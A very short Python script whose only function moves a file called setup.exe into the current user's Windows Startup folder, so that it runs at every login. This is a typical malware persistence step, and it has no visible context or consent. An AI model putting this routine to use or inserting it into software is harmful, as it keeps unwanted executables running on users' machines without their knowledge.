import shutil
import os


def start():
    shutil.move('./setup.exe', '{0}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\setup.exe'.format(os.environ['appdata']))